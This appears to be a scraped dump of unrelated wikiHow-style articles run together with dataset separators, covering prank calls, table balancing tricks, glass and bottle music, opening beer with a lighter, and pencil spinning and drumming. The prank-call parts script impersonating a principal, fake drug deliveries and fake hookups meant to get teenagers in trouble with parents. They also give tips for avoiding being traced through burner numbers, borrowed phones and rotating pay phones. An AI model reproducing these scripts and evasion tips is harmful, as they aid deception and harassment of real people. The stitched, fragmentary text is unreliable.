You: ""Hello, this is Mr. Jones, the principal at San Marcos High school. Am I speaking with Mrs. Smith?""

Mrs. Smith: ""Yes. How can I help you?""

You: ""This is about your son, Jeremy. I'm afraid to inform you that he's in big trouble here. He got into a fight with two boys and is on his way to my office. I'd like you to come here as soon as possible so we can discuss the matter.""

Mrs. Smith: ""My goodness! I'll be over there as soon as possible.""

, If you have a friend who is particularly afraid of her parents and is worried that she'll get in trouble for almost anything, even getting home ten minutes past her curfew, then you should call her pretending that you're confirming pot delivery to her home. Here's how you do it:Kelley: ""Hello?""

You: ""Hey, is Kelley there?""

Kelley: ""This is Kelley.""

You: ""Cool. I just wanted to confirm the weed delivery for tomorrow. Someone will be dropping by to deliver the goods at 6 pm.""

Kelley: ""What? I didn't call for any weed delivery. You must have the wrong person.""

You: ""This is Kelley Murray, right? You go to John P. Stevens High School?""

Kelley: ""Yeah, but -- cancel the order. My parents will kill me.""

You: ""Just look out for a yellow Hummer. Someone will be there at 6 pm sharp. Goodbye.""

, This is another great one. If you really want to annoy someone you know and to get them in big trouble with their parents, then you should call them posing as a random hookup of their daughter or son. Here's how you do it:



Mr. Wolf: ""Hello?""

You: ""Uh, hi. May I please speak to Mr. Wolf?""

Mr. Wolf: ""Why yes, this is he. How can I help you?""

You: ""So, um, this is kind of awkward, but I was in your daughter Marla's room two nights ago and I left my wallet behind.""

Mr. Wolf: ""You what?""

You: ""Well, I was hooking up -- er, hanging out -- with your daughter, and I left my wallet in her room. I've been trying to call her for two days but she's been ignoring me, so I had to call the house. Sorry, sir, but I really do need my wallet.""

Mr. Wolf: ""How did you get in the house?""

You: ""Oh, I did what all the guys do. I snuck in through the window.""

Mr. Wolf: ""You what?""

You: ""I went through the window? Anyway, would you mind looking for the wallet for me, sir?""

Mr. Wolf: ""And where might I find it?""

You: ""Well, um, it should be at the bottom of the bed. Next to my boxers. Would you mind grabbing those too?""

, Let's say you and your friend went out to the bars the night before and he got so drunk that you know he won't remember what happened. This is the perfect opportunity to pretend to be a love interest that the person met at the bar and to make him really nervous.



Jake: ""Hello?""

You: ""You sound even sexier over the phone.""

Jake: ""Excuse me?""

You: ""I said, you sound even sexier over the phone. I had so much fun with you last night.""

Jake: ""Who is this?""

You: ""Don't play dumb with me.""

Jake: ""Uh...is this a joke?""

You: ""This is Stacey. From Rick's cafe. We spent a lot of time in the bathroom having some fun? You told me I was the perfect girl for you right?""

Jake: ""Uh, right...

You: ""Don't be embarrassed. I know you love me. I think it's cute when men are so open like that. Anyway, it was so sweet of you to offer to go to the wedding with me today. You know how embarrassing it is when your plus one bails at the last minute, especially when it's your sister's wedding...my parents will feel so much better now.""

Pretend that the person called you.,
Pretend that the person left a note on your car.,
Act like you and the person are partners in crime.,
Ask to speak to people with suggestive names.",How to Make a Prank Call3," One great prank call for a stranger is to call a person repeatedly pretending he or she called you. Just don't do it too much or this will be considered harassment. Try this on for size:



You: ""Hello? Hello?""

Other person: ""Hello?""

You: ""Who is this?""

Other person: ""Uh, who is this? You're the one who called me.""

You: ""No, you're the one who called me. Who is this, and how can I help you?""

Other person: ""There must be some mistake."" (Hangs up.)

You: ""Hello? What do you want?""

Other person: ""Look, you called me again.""

You: ""What are you talking about? My phone just rang again. This is getting a little ridiculous.""

, Act like the person left a note on your car apologizing for hitting it. This is a great way to make a stranger feel completely confused and very flustered.



Other person: ""Hello?""

You: ""Hi, this is the person who owns the red Mazda you hit yesterday?""

Other person: ""Excuse me?""

You: ""You left a note on my car. You hit the side of my car in the Shop Rite parking lot? Thanks so much for leaving a note -- I know so many schmucks would just drive away.""

Other person: ""No, I'm sorry, I didn't go to Shop Rite yesterday. There must be some mistake.""

You: ""But this is the number that was left. Look, man, my car is completely ruined. I took it to the shop this morning and there's at least five thousand dollars in damages here. I can't even drive it for three days.""

Other person: ""I'm sorry, but that really wasn't me.""

You: ""So you're changing your tune now, eh, Mr. Good citizen?""

Other person: ""Look, I'm going hang up now.""

You: ""Don't worry -- I'll be right over to talk about this. Good thing you left your address too!""

, This is a silly one -- pretend that you and the person committed a crime together. Act like you're in cahoots and insist that the person doesn't have to play dumb with you. Here's what you do:



Other person: ""Hello?""

You: ""They're on to us. They know what we did to Jim.""

Other person: ""What?""

You: ""I said, they know. Listen, we need to get out of town.""

Other person: ""I don't know what you're talking about.""

You: ""Don't play dumb! It was all your idea!""

Other person: ""I don't know any Jim -- ""

You: ""I'll be over in fifteen minutes. Pack up.""

, This type of prank call has been made famous by Bart Simpson. This is a short but sweet way to make a prank call. All you have to do is call and ask for people with a variety of names that will sound offensive when they're repeated. Just ask for the person and sit back and wait for the victim to realize what you've said when he repeats the name. Here are some great names to try:


""Master Bates.""
""Mike Rotch.""
""Bea O' Problem.""
""Al Coholic.""
""Ivanna Tinkle.""
""Amanda Hugginkiss.""
Hugh Jass
"" Wilma Leggrowbach""

Find a salt shaker.,
Pour a small amount onto the table.,
Press the bottom edge of the salt shaker into the salt pile.,
Blow away the remaining salt.",How to Balance a Soda Can at a 45 Degree Angle2," A salt shaker similar to a standard one you would find at most restaurants will work. Make sure the shaker has some salt to spare, as this trick doesn’t work without salt available.


Salt shakers without a beveled edge may have a more difficult time performing this trick, as it is harder for the salt to wedge itself under the shaker and prop it aloft. Top heavy salt shakers may also present a problem.

, Not much salt is needed for balancing the shaker. Shake just a small amount, roughly the size of a quarter, onto the table. Don't pour too much - you don't want to make a mess, and only a small amount is necessary.

, Press the shaker all the way into the salt, and occasionally let go to see if the shaker has balanced itself. Don’t get discouraged if it doesn’t work at first – this part is largely trial and error. There is no trick!


This can work with sugar crystals as well. However, it is a more difficult to achieve balance, as sugar granules are more fine, despite having a similar shape., Once the shaker is stable and in place, blow the remaining salt away. This will remove any trace of salt, except for the few granules that are holding the shaker in place. It will appear the salt shaker is standing askew on its own. Confound your friends with the power of science!


This can work with a pepper shaker as well, though it cannot balance on pepper!
Salt granules have a square shape, meaning they have flat sides that can easily prop the salt shaker into place."

Gather up the materials.,
Push the two forks together.,
Find the center of mass of the utensils.,
Insert a toothpick into the center of mass.,
Balance the forks and toothpick on the rim of a glass.,
Burn the edge of the toothpick.",How to Balance a Soda Can at a 45 Degree Angle3," Grab several utensils that you are not particularly worried about. You will be pushing a fork and spoon together and balancing them on a glass, so they are bound to fall a few times, and possibly get dinged or bent, as you get the hang of the trick. In total, you will need the following:


Two forks.
A toothpick.
A glass of water.
A wine cork.
Matches.
A spoon (optional)., Push each fork’s teeth into one another so that it is snugly interlocked. You want to be able to operate the two utensils as one “unit.” When you pick up the handle of one utensil, the other utensil should be lifted as well.


You may use a spoon and fork rather than two forks if you desire. Note that this may bend the teeth of one of the forks.

, Rest the middle of where the utensils meet on your finger. Move the utensils back and forth on your finger until you they are perfectly balanced, with no other help needed to stay perched on your finger. This is the center of mass.

, Force the toothpick into the center of mass by wedging it into where the two forks’ teeth meet. Use just enough force to move the toothpick into the forks without breaking apart their hold to one another. This might take a few tries!


If your toothpick breaks apart or can’t find a wedge, try taking the forks apart and putting them back together, a little less snug this time.

, Find the point on the body of the toothpick that will perfectly balance the forks on the rim. The forks will lay horizontally along the rim of the glass, encircling the top.


A little trial and error is all that is needed. You can try starting with a longer tooth pick if that helps you achieve the balance needed.
You can also balance utensils this way on surfaces other than glasses. Try salt or pepper shakers if they're available!, Use a match and light the end of the toothpick overhanging the glass on fire. The toothpick will slowly burn away. Continue to do so until only the portions of toothpick touching the rim and overhanging. Wipe away the burned portions of toothpick to complete the illusion.

Ask a local restaurant for a recipe.,
Call an Italian restaurant asking for Chinese food.,
Order a pizza for someone you hate.",How to Make a Prank Call4," This is a silly yet effective method for a prank call that will instantly confuse the person you're calling -- and annoy him or her more than a little bit. Here's how you do it:Restaurant employee: ""Hello?""

You: ""Hi, I'd like the recipe for your chicken enchiladas, please.""

Restaurant employee: ""Excuse me?""

You: ""I said can I have the recipe for your chicken enchiladas, please? I want to make them tonight.""

Restaurant employee: ""I'm sorry, sir, but we can't give that information out.""

You: ""Come on! I'm really hungry.""

Restaurant employee: ""If you want our chicken enchiladas, you'll have to order them.""

You: ""No way! They're way too expensive!""

, This one is simple. Act flustered when the restaurant won't give you the food you want. Just follow the steps:Restaurant employee:: ""Hello?""

You: ""Hi, I'd like to order some egg drop soup and beef fried rice.""

Restaurant employee:: ""I'm sorry, but you must have the wrong place. This is Bruno's -- we're an Italian restaurant.""

You: ""I know who you are, but I'm having a craving for some egg drop soup and beef fried rice.""

Restaurant employee: ""That's not on the menu.""

You: ""What do you mean, it's not on the menu? What kind of a racist are you? This is unbelievable!""

, This one is easy -- just call your local pizzeria and order a large pepperoni pizza to the home of someone you don't like. The person will be flustered and confused when the pizza delivery man shows up at his door.

If they find out it was you, deny everything.",How to Prank Call Someone You Know," Is it a good friend or your sibling who probably would know it was you? Figure out a good reason to call them. Were they going to do something today? Did they recently do something they wouldn't want anyone to know about? Do you want to freak them out with a call from their crush or ex-boyfriend? Or do you just want to bother them?;
, If they recently had a party when their parents weren't home, call their mom pretending to be someone who was at their party and wanted to tell them how great it was. People usually ask who is calling if they don't recognize the number, so...

, If you are calling someone claiming to be a telemarketer, then you won't need a name. Just say ""I'm with _ company and I would like to interest you in _ product"" every time they ask for your information.

, If you are a girl, you probably shouldn't go for a deep voice unless you're sick. But if you're a boy, doing a high voice never works. if you want to sound like a moron, say ""what chu talkin' bout?"" every time they ask you about who you are. But if you want to sound like a parent or cop or principle or someone in power, then don't sound like a wimp, sound like you know exactly what you're talking about.

Call from a pay phone.",How to Make a Prank Call and Not Be Caught1," Using this code will keep your phone number from appearing on a caller ID display. This code works best when you are making one harmless prank call from a cell phone or home phone. The protection that *67 provides can be destroyed pretty quickly if it needs to be.


This code is fairly useless if the police get involved because they can bypass that code easily to get your information.It usually won’t help you when you prank a toll-free number because those organizations typically use a different phone system.
Most internet-based services, such as Skype and Google Voice, won't let you dial *67 from their lines.;
, Prepaid cell phones, also known as burners, are sold at most gas stations and no personal information from you is required to buy them or use them. Keep in mind that they are equipped with GPS, so if you are using one while you’re at home, you can be traced that way.


Buying these cell phones can quickly turn into an expensive habit, since they aren't cheap. If you're a frequent prankster, burners aren't an ideal solution.
It's entirely possible that your friends and family may begin to suspect that you’re a drug dealer if they see you with burners frequently. This is a common stereotype created mostly by crime-related television shows.

, There are now phone apps that allow you to generate disposable phone numbers to make calls with, essentially keeping your real information hidden and your personal phone number clean. These apps provide the anonymity of a prepaid cell phone at a fraction of the cost, making them a very effective, convenient and cheap solution.


The most infamous app of this kind is called Burner, but there are a handful of others in existence., These services are a great way to make prank calls because they aren’t tied to any location, making them really hard to trace. However, they aren’t impossible to trace by the police, especially if you give them a reason to do it, and you can be arrested.Follow the same guidelines that you use for pranking with a cell phone or landline.
These internet services are usually free to use or have a very nominal monthly fee, making them financially feasible choices for pranking.

, This won’t prevent trouble for the actual owner of the phone, but it will keep you from being caught. Try to be stealthy if you’re attempting this, especially if you’re a frequent prankster and your friends know it.


They’ll probably identify you as the culprit right away and start hiding their cell phones when you’re around.
If you are caught, prepare yourself to face a furious phone owner.

, This is especially true if you live in a small town, but it’s an excellent general rule that all pranksters should follow. When you make local prank calls, especially to multiple local numbers, and your victims end up calling the police, it’s incredibly easy for them to use a local phone company to discover the caller’s identity.


If you are prank calling someone who lives in another part of the country, it’s nearly impossible to trace because your victims aren’t able to call the local police to show up at your residence and give you a lecture.

, Pay phones still exist, although they are getting increasingly harder to find these days. If you’re a serious prankster, it would benefit you to track down the locations of payphones in your area.


Skip around so that you never make a prank call from the same pay phone twice in a row.
If you are making prank calls that are bothersome or upsetting enough for the person on the other end to contact the police, they will definitely start checking security camera footage from the surrounding areas and they’ll probably attempt to lift your fingerprints from the pay phone."

Fill a wine glass with water.,
Dip your finger in the water.,
Run your finger along the rim of the glass.,
Fill a variety of wine glasses.",How to Make Noise With a Glass1," The amount of water you place in the glass will affect the pitch of the sound that is created. The more water placed in the glass, the lower-pitched the sound. Conversely, the less water placed in the glass, the higher-pitch the sound.You may use other types of liquid in your wine glass to make music, but note that thicker liquids have a harder time creating music, and may alter the sound produced.;
, In order to create the friction needed to produce the “song,” your finger will need to be wet. This removes some of the oils from your fingers, allowing your finger to get the right “grip” on the glass rim.Wash our hands prior to dipping your finger in the water to attain an especially oil-free finger.
Dipping your finger in vinegar is also an effective way of clearing your finger of oils.

, While holding the glass from the bottom with your other hand, move your finger around the border of the glass. You want to reach a midway point between being able to move your finger smoothly around the rim, and the drag created by the friction of your finger.


Do not press too hard or too loose. You’ll either create too much friction, or not quite enough to produce the perfect pitch.
A slight change in the pressure you place on the rim of the wine glass can raise or lower the volume of the song., By filling multiple wine glasses with different amounts of liquid, you can produce a range of notes. Put on a little after dinner show by yourself, or invite the kids to make some music.


Wine glasses come in a variety of shapes, some thinner, and others squatter. The types of sounds produced by these glasses will differ from a standard glass, so try a variety of types.Wine glasses can also be played while partly submerged in water. This is called an inverted wineglass harp, and can allow you to play multiple notes easily with just one glass."

Use a glass bottle.,
Empty the bottle of its original contents.,
Refill it with flat water.,
Stay clear of electrical devices.,
Wear protective clothing.,
Hold the bottle over a bucket or other container.Remember: the glass that breaks free from the bottle may break again when it strikes the ground.,
Aim the bottom of the bottle away from everyone.,
Grip the bottleneck tightly.,
Hold the bottle still.,
Strike the bottle with your other hand.",How to Blow the Bottom out of a Bottle," Expect plastic bottles to be much more durable than glass ones.So, in other words, don’t expect this trick to work on them. Stick to glass bottles, since these are much more likely to break (which, in this case, is what you want to happen).The size of the bottle shouldn't matter, as long as you can hold it up when it's filled with water.;
, The one exception to this rule would be if it held flat, plain water. Otherwise, pour out or drink up the original liquid. Definitely do so if it’s carbonated (such as soda or beer). Expect the bubbles in carbonated beverages to prevent this trick from succeeding., Once it’s empty, fill it up again with plain water. Remember, though: carbonation is the enemy, so don’t use seltzer or sparkling waters.Also, don’t fill it all the way up to the brim. Leave an inch or two (2.5 to 5 cm) of air on top.You could possibly try using other flat, non-carbonated beverages, but water is a sure-fire bet.

, Keep in mind that, if successful, you’re going to soak the immediate area with a bottle’s worth of water. Make sure there aren’t any wires or plugged-in devices nearby. Eliminate the risk of electrical shock.

, Also keep in mind that glass is about to break and fall free from the rest of the bottle. Reduce the risk of getting cut by covering any exposed skin below your waist. Wear pants instead of shorts and shoes instead of sandals.

, Use a bucket to catch both the glass and the water. Make clean-up a cinch without the risk of cutting your bare feet later on if you step on a small piece of glass that you missed while sweeping up.

, Keep other people’s safety in mind, too. Do not aim the bottle’s bottom at anyone. If you’re not using a bucket, clear the area and spread your feet wide apart.

, Keep a firm grip on the bottle.At the same time, be sure to keep your hand close to the top. Expect each bottle to break differently when you do this trick, so keep your hand well away from the bottom to reduce the chance of cutting yourself.

, Maximize all the force that you can muster when you strike the bottle’s top in just a moment. Do this by holding the bottle as still as you can. Expect to lose some force when you make contact if you’re moving the bottle this way and that., Raise your free hand and then bring it down sharply. Strike the bottle’s mouth dead-center in your palm. Ideally, this will cause the bottom to burst.However, it may take a few tries, so just keep trying if at first you don’t succeed.Alternatively, you can use a rubber mallet instead of your hand so it doesn’t become bruised or numb from too many tries."

Keep emergency services, police stations and fire departments off-limits.Prank calling any of these organizations is never wise and not recommended.,
Do not impersonate a police officer or FBI agent in a prank call.,
Avoid calling emergency and crisis hotlines.,
Do not make threats or engage in hostile behavior.,
Avoid asking for any personal information.,
Do not record your prank calls.",How to Make a Prank Call and Not Be Caught2," If you do it, you will be traced and legal action will be taken against you.""Swatting"" is a relatively new trend that involves reporting a fake crime to the police that could result in a SWAT team being sent out. Never engage in this behavior. It can be punishable by prison and has been referred to as an act of terrorism.
There are so many other people and businesses out there to prank call – there is never any acceptable reason for pranking any of these organizations.

, Your chances of getting traced increase substantially if you impersonate law enforcement, and you can get in big trouble for doing it. Most people who impersonate law enforcement are doing so in order to commit a crime, so if you get caught doing this, you'll be assumed to be a criminal until proven otherwise and you will be arrested.

, It’s not funny to prank call a suicide hotline and pretend you’re on the verge of killing yourself, and it’s been done a million times before anyway. In fact, you should avoid calling any kind of hotlines designed to help people.


It may seem like the perfect set up for hilarious pranks, but people can and do get arrested for this.
Within the past few years the DJ of a prank call radio show was arrested for pranking an anger management hotline. The police were at his house within 15 minutes., Threats of all kinds should be off-limits during prank calls, including bomb threats and physical threats. Even insinuating a threat is risky. When people feel threatened, emergency services and police officers usually get involved pretty quickly.

, Surprisingly, it’s not that difficult to trick people out of their personal information, even their credit card numbers and other account numbers, by pretending to be someone’s bank or a legitimate sounding bill collector.


Even if you never intend to use any of this information and didn’t even write it down, your victim will probably realize their mistake not long after the phone call and assume you’re an identity thief.
They will call to the police to report attempted identify theft and you’ll be found out pretty quickly., Doing so may seem harmless to you, but law enforcement considers it to be wiretapping. Currently, federal law on the subject states that it's not illegal if one or both parties have consented to the call. However, the state laws vary. Some of them are far stricter than the federal law, considering it to be illegal without written authorization from your victim. Since many pranksters make out-of-state prank calls, this can be a problem.If you want to share a prank call recording publicly, such as on social media, the law requires that a “Recording Release and License” be signed by all participants on the call.
If you have a collection of recordings that you want to release and sell, things become even more complicated. Not only do you need the above-mentioned license, but doing this may also be considered copyright infringement, since the recorded call is a ""joint work"" and your victim technically owns half of this enterprise. Essentially, you would then owe them royalties.Because of the extreme amounts of legal red tape surrounding the recording of prank calls, the best thing to do is avoid it completely.

Prepare in advance.,
Keep it short.,
Avoid calling the same number twice.,
Stifle your laughter.,
Keep your tone silly and lighthearted instead of serious.",How to Make a Prank Call and Not Be Caught3," Plan out your prank and what you want to say before you make the call. If you don’t sound sure of yourself when the victim answers, or if you stutter or hesitate, you’ll give yourself away. At the very least, have your opening line prepared.


If you are planning an elaborate prank, script it out before you call.

, Long prank calls are hard to pull off, and the longer you have the other person on the line, the more suspicious they become. Keep your pranks short, sweet and silly. 5 minutes or less is a good goal for the length of a prank call.

, Calling the same person over and over, no matter how hilarious it is to you, is harassment. If your victim feels harassed, the police will get involved and you’ll be caught.


Try to keep your pranks limited to one call per victim, or at the most, two.
Prank them, laugh, and move on from that phone number forever., Find your phone’s mute button and if you absolutely have to laugh, use it. Laughing at the very beginning of the call will give you away immediately, so try to hold it together. It’s okay to start laughing at the end, when the prank is starting to disintegrate and becoming obvious to the other person.


In fact, giggling at the end can actually benefit you, since it will show the person that it was just a harmless prank and not a big deal.

, Serious pranks that upset other people are usually not very funny at all. They also escalate your chances of being caught by stressing your victim out so much that they feel the need to call the police. Keeping your prank calls on the silly side not only protects you from getting in trouble, but the calls are more fun to make and usually funnier, too.


Try to craft your pranks so that, by the end, the other person is laughing with you.
Occasionally your victim will outfox you and call you out on your prank, and then both of you will get a good laugh. Don’t take yourself too seriously!

Fill a standard drinking glass with water.,
Line up your drinking glasses.,
Tap the glasses with a solid instrument.,
Play a few songs.",How to Make Noise With a Glass2," The amount of water you place in the glass will affect the pitch of the sound that is created. The more water placed in the glass, the lower-pitched the sound. Conversely, the less water placed in the glass, the higher-pitch the sound.


Fill several more glasses of water to replicate several different musical notes. Such glass-based instruments have been in use for many years!More delicate glasses, such as wine glasses, are not ideal for making percussive sounds. They are fragile, and more prone to breaking when rapped with an object.

, Arrange the glasses in a logical musical order. You may choose highest to lowest pitch, lowest to highest, or any order you desire, provided you can remember the order.


Test each glass with a tap from a fork, spoon, pencil, or other implement, as you are adding water. You can pour out or add water as desired to reach just the right pitch.

, Dinner utensils are common instruments used to play the glasses. However, pencils, pens, rulers, or even drum sticks can be used to similar effect.


Take care not to hit the glasses too hard. You can end up cracking the glasses, or even breaking it entirely.

, Fill 6 glasses with varying amounts of water - between three and a quarter inches all the way up to five and three quarters. Label them numerically, one through six. With just these six glasses, you can play some simple tunes.

Uncap a beer or soda bottle of your choice.,
Blow across the top of the bottle rim.,
Drink that beer.",How to Make Noise With a Glass3," The shape of the bottle, as well as the amount of liquid in the bottle, will affect the type of sound produced. Feel free to take a few sips, as the sound of the bottle when first uncapped will be very tinny, as it is nearly full.


If you have a tuning device with a microphone, you can determine the amount of liquid needed in the bottle to produce particular notes.
A tuning fork can also help determine pitch, if you have an ear for sound. Tuning forks typically come in the notes of E, A, and C, and will be labeled according to their frequency., Produce a thin, concentrated breath. You want the air to travel horizontally across the top of the rim, rather than directly inside of the bottle. You should hear a hollow sounding, dull whistle.On a windy day, set your beer bottle on a table. The wind will glide across the bottle, producing the type of sound you are looking to emulate.
As you drink from the bottle (or fill it up), use a marker to note how much liquid is needed for particular notes. You can then use this bottle to gauge how to fill up other bottles to create harmonious notes., You want to make different sounds, don’t you? Alternatively, you can uncap several beers and drink them in varying amounts to create a few different pitches to choose from.Grab a few old bottles from the recycling bin and fill them water, if you don’t feel like drinking copious amounts of beer (or are not of age).
Cookouts or house parties are perfect opportunities to gather a group of bottles together for creating music.

Hold the beer close to the cap with your non-dominant hand.,
Fit the long bottom edge of the lighter underneath the cap.,
Hold the metal end of the lighter firmly.,
Slide your finger up the neck of the bottle so that the lighter is wedged firmly under the cap.,
Push down quickly but firmly on the lighter to remove the cap.",How to Open a Beer Bottle with a Lighter1," Curl your index finger just under the cap, leaving only a little bit of space. The closer you can get your finger under the cap and still fit the lighter edge underneath the easier this will be.









Your finger will be the fulcrum that holds the lighter under the cap. As you push down on the lighter, your finger will keep it pinned under the cap until it pops off. Thus, the closer your finger is to the bottom of the cap, the better.;
, Don't use the rounded corner. Instead, use the long plastic edge of the lighter bottom and place it under the cap. One side will be resting on your left pointer finger, curled around the top of the bottle (if you're right-handed).









The lighter should be perpendicular to the beer bottle., You want to be able to push down on it with smooth, even force.







, Your finger acts as the fulcrum that pops the cap off, so it needs to be firm.








, You should feel the lighter digging slightly into your finger, but quick downward pressure should pop the top quickly. It is exactly the same pressure and firm movement that you would use with a traditional bottle opener.









It may help to angle the beer slightly towards the lighter. If so, push down parallel to the bottle to get the most force on the lighter."

Hold the pencil between your index finger, middle finger, and thumb.,
Pull with your middle finger like a trigger.,
Roll your wrist to help get the pencil around your thumb.,
Move your fingers out of the way so they don't block the pencil's spin.,
Catch the pencil.,
Practice, practice, practice.",How to Spin a Pencil Around Your Thumb," Grasp your pencil in your dominant hand - your index and middle finger should be spaced apart from each other by about the width of your thumb. In other words, if the pencil was not there, your thumb should be able to fit comfortably between your index and middle fingers.

Opinions vary about which part of your pencil you should grip. Some prefer to grip the pencil in the middle, near its center of gravity, while others like to center their grip at the end of the pencil. It's up to you - experiment to see which you find easier.;
, In this trick, your middle finger provides most of the energy for spinning the pencil. Gripping the pencil between your thumb, index, and middle fingers as described above, pull or flick your middle finger inwards as if you were pulling the trigger of a gun. Ideally, this will cause your pencil to begin turning around your thumb. If you're having trouble getting the pencil around your thumb, re-examine your grip - if your middle finger and thumb are aligned too closely to each other, you may be pulling the pencil into your thumb, rather than around it.









It's tricky to find the perfect amount of force with which to move your middle finger. Too much force will cause the pencil to go flying, but if you use too little force, the pencil won't make it all the way around your thumb. Practice makes perfect - with time, you'll develop a sense of how much force makes your pencil spin ""just right"".

, Beginners usually experience trouble spinning pencils at the outset. Often, they have difficulty getting the pencil to turn completely around the thumb. To make this easier, try rolling your wrist as you pull with your middle finger. Gently turn your wrist (as if you were turning a doorknob) away from your body as you make your ""pull"". This imparts added momentum on the pencil, and, as an added benefit, helps to keep your fingers out of the path of the spinning pencil.








, When you're learning how to spin a pencil, it's important to be conscious of the positions of your fingers after the initial ""pull"" from your middle finger. One common mistake among beginners is to unknowingly obstruct the path of the spinning pencil with their index or middle finger. There are several techniques for keeping your fingers out of the way - two are listed below:









After the initial ""pull"", tuck both your index and middle fingers in so that they are under the joint of your thumb. The pencil should spin around your thumb above your fingers.
Simultaneously fold your middle finger in at the joint closest to your hand and extend your index finger as far as it goes. Your middle finger should end up resting with the inside of its last joint on the thumb. The spinning pencil should miss your extended index finger.

, The most impressive part of spinning a pencil isn't necessarily the spinning pencil itself - it's the fact that the person spinning the pencil is able to effortlessly catch the pencil and repeat the trick over and over. Once you've gotten the hang of spinning your pencil, work on ""catching"" the pencil without fumbling it. After one turn, angle the spin of your pencil into the side of your middle finger. As it makes contact with your middle finger, use your thumb and index finger to support the pencil from opposite sides.








, The act of spinning a pencil will undoubtedly feel awkward at first. However, like any feat of dexterity (such as riding a bike or performing a sleight-of-hand trick), with time, the motions involved in this trick will become so natural that it will be difficult to spin the pencil incorrectly. As you practice, experiment with different grips, techniques and angles until you find the perfect combination.









For added practice, once you've mastered this trick in your dominant hand, try using your non-dominant one!

Grip the body of the bottle firmly with your non-dominant hand.,
Hold the lighter tightly in your fist so that bottom 1/2"" is all that is visible.,
Wrap your thumb around the top of the bottle.,
Fit the long edge of the lighter underneath the cap.,
Hold the bottle firmly in place as you push up and out with the lighter.",How to Open a Beer Bottle with a Lighter2," Keep it low and out of the way, but make sure you have a nice, firm grip on the bottle so it doesn't slide off. Your dominant hand will hold the lighter, using the thumb to grip the top of the bottle, as you pry the cap off.








, You want to have the lighter firmly in your hand, with a bit of the lighter's bottom poking out of the thumb side of your first.


The lighter will be in line with the point of your middle knuckles. In other words, the long side of the lighter bottom will be parallel with your thumb.

, It should be just under the cap, providing pressure to keep the bottle in place as you pop off the cap. The lighter will be on the opposite side of the bottle as your thumb.









If you're right handed, your hand will look a bit like a backwards, lowercase ""e."" The curve at the bottom is your thumb, the hole in the top is the lighter in your fingers. The bottle will fit in between, in the curve between your thumb and finger.

, This bottom edge will be dug underneath the grooves of the cap and used to push the cap up and off the bottle.









Do not use the rounded corner edge, as this is a smaller surface that can slip easily.

, Think of rotating your fist up and away from the bottle. Your lower hand should hold the bottle down as you push up on the cap with the of the lighter. Turning your wrist away from the bottle, while leaving your thumb on the other side, will create the torque needed to pop the cap off.








"
"
Use more force, applied quickly, if only part of the cap pries off.,
Make sure your finger is tightly under the cap if it feels like you need to use a ton of force.,
Tilt the bottle towards the lighter if the lighter keeps slipping off the cap.,
Try another method if you still can't get the cap off.",How to Open a Beer Bottle with a Lighter3," It only a small part of the cap comes of, it likely means you didn't use the force on the lighter quickly enough. Simply rotate the bottle 180 degrees and try again-- you can usually pry the bottle cap off slowly if you've already started one side.








, If you feel like you're really straining to to get the cap off, you're not creating enough of a fulcrum. Make sure your fingers are right under the lighter, allowing you to use them to pry the cap off.








, Line the bottle edge up under the lighter so that the ""teeth"" of the cap are touching as many bits on the lighter as possible. If you're doing it correctly, you'll likely end up with little nicks and teeth marks in the plastic.








, Luckily, there is a variety of other methods to open a beer bottle that don't require a lighter.









Use a door by placing the cap in the frame (the small metal square that allows the door to stay closed) and applying downward pressure to pop the cap off.
Use a ring.
Use an old CD.

Set up a table drum kit.,
Understand the cymbal’s function.,
Play a steady Hi-hat part.,
Utilize your hands and feet with the pencil.",How to Make Beats with Your Pencil1," You can imitate a lot of tones from a drum kit with the proper table setup. Since most people like to use pencils to procrastinate at school and work, you might have a variety of notebooks and books. Hardcover books or textbooks make great drum tones when played with pencils. Notebooks create a smoother tom sound.


Experiment with the supplies you have.
Water bottles can create a variety of tones based on how full or empty the bottle is.Play around with two pencils and pretend like you are John Bonham playing Moby Dick.;
, Many people, without knowing it, imitate playing a cymbal on a drum kit using a pencil. There are several types of cymbals on a drum kit. The common cymbals are the hi hat, ride, and crash. The Hi-hat is the most commonly used drum cymbal because drummers can have it closed or open, which make the cymbal versatile. The ride is a smoother cymbal that creates a larger sound than the Hi-hat.


A crash cymbal is usually for accenting parts of a song. The crash is used sparingly and for louder parts.
Both the Hi-hat and ride cymbals are used as a steady beat indicator., An easy sound to imitate with a pencil is the closed Hi-hat. The closed Hi-hat is a crisp tone that doesn’t resonate like a ride or crash cymbal. Practice playing a steady beat by counting 1-2-3-4 1-2-3-4 while tapping along to the number with your pencil. This is a standard 4/4 timing.


To play an even steadier beat, play along to a metronome or to the radio. Not all songs are played in 4/4 time.
You can also practice triplets by counting 1-2-3 1-2-3. A triplet is a beat that equally balances three notes as a measure or half of a measure., All good pencil beats are accompanied by other parts of your body. If you use the pencil as the cymbal, you can utilize different hand shapes to create other sounds of the drum kit. Create a fist to imitate a bass drum, or kick drum. You can then use an open palm to create a snare drum.


You can also use your feet to imitate a kick drum or low toms. Toms are parts of the drum kit that vary in pitch. They are typically used for drum fills and soloing.Try to incorporate other drum sounds with your cymbal pencil.

Play beats on the go.",How to Make Beats with Your Pencil2," The swing beat is a common jazz rhythm that is easy to imitate with a pencil. If you’ve ever listened to jazz or swing music, you’ll be able to recall this beat. Try counting out 1-2-3/4, and for the 3/4, don’t pause like you do between 1 and 2. Once you start to get a feeling for the swing beat, you can add your own varieties., Snare rolls are a type of drum fill purely performed on a snare drum. Play a snare roll by holding a pencil in each hand. Count out 1-2-3-4 1-2-3-4, but alternate your hands after every hit. You can keep time by tapping your foot in half time. Start slow and work your way towards a fast snare roll, or in this case, a pencil roll.

, Paradiddles are drum exercises you can practice to improve your rhythm and coordination. Most paradiddles consist of a 4/4 tempo where you alternate between your left hand and right hand in a specific way. A paradiddle played in 4/4 means that each hit falls on a number when you repeat counting 1-2-3-4. This is an example of a 4/4 paradiddles explained in right hand (R) and left hand (L) :


R-L-R-R-L-R-L-L, Carry around two pencils and play when you feel the urge. The beauty of playing on the go is that you can play on any given surface. This is a great way to sample various sounds. For example, a pencil hit against a chain link fence will sound different than one hitting a metal pole.


Finding different sounds can benefit you if you like to record sounds outside of a recording studio.
Bring a field recorder with you and document any sounds that stand out to you.

Balance the pencil in your hand.,
Play bass sounds of the pencil.,
Experiment with the treble of a pencil.,
Create beats with just a pencil.",How to Make Beats with Your Pencil3," Playing a beat with just one pencil is a bit more complicated that using your hands in combination with a pencil. You should hold the pencil in a way that you can utilize both ends of the pencil quickly.


